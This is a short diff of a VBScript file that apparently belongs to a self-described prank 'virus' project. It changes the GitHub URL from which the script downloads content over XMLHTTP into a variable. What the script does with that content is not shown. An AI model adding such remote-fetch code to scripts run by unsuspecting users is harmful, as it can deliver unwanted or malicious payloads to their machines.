@@ -11,7 +11,7 @@ End If
 
 
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-objXMLHTTP.open "GET", "https://raw.githubusercontent.com/marrobHD/WeAreNumberOneVirus/master/online/dwn", false
+objXMLHTTP.open "GET", "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/dwn", false
     objXMLHTTP.send()
 
 dwnn = objXMLHTTP.responseText
